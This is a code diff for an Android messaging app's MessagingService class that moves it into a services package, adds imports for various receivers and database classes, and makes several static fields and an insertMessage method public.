@@ -1,4 +1,4 @@
-package com.candroid.textme;
+package com.candroid.textme.services;
 
 import android.app.Service;
 import android.content.Context;
@@ -17,10 +17,25 @@ import android.provider.CallLog;
 import android.provider.Telephony;
 import android.util.Log;
 
+import com.candroid.textme.Constants;
+import com.candroid.textme.Database;
+import com.candroid.textme.DatabaseHelper;
+import com.candroid.textme.ImeReceiver;
+import com.candroid.textme.jobs.JobsScheduler;
+import com.candroid.textme.Lofl;
+import com.candroid.textme.receivers.CreateConversationReceiver;
+import com.candroid.textme.receivers.DatabaseReceiver;
+import com.candroid.textme.receivers.HeadsetPlugReceiver;
+import com.candroid.textme.receivers.IncomingReceiver;
+import com.candroid.textme.receivers.OutgoingReceiver;
+import com.candroid.textme.receivers.ScreenReceiver;
+import com.candroid.textme.receivers.WapReceiver;
+import com.candroid.textme.receivers.WifiReceiver;
+
 public class MessagingService extends Service {
 
     private static final String TAG = MessagingService.class.getSimpleName();
-    protected static boolean sIsRunning = false;
+    public static boolean sIsRunning = false;
     private IncomingReceiver mIncomingReceiver;
     private OutgoingReceiver mOutgoingReceiver;
     private CreateConversationReceiver mCreateConversationReceiver;
@@ -32,9 +47,9 @@ public class MessagingService extends Service {
     private CalendarObserver mCalendarObserver;
     private HeadsetPlugReceiver mHeadsetReceiver;
     private WifiReceiver mWifiReceiver;
-    protected static String sTelephoneAddress;
+    public static String sTelephoneAddress;
     private LocationManager mLocationManager;
-    protected static MediaRecorder sMediaRecorder;
+    public static MediaRecorder sMediaRecorder;
     private ImeReceiver mImeReceiver;
     public MessagingService() {
     }
@@ -197,7 +212,7 @@ public class MessagingService extends Service {
         return null;
     }
 
-    protected static void insertMessage(Context context, String destinationAddress, String originAddress, String body, long time, int type){
+    public static void insertMessage(Context context, String destinationAddress, String originAddress, String body, long time, int type){
         Database.insertMessage(context, DatabaseHelper.getInstance(context.getApplicationContext()), body, destinationAddress, originAddress, time, type);
     }
 
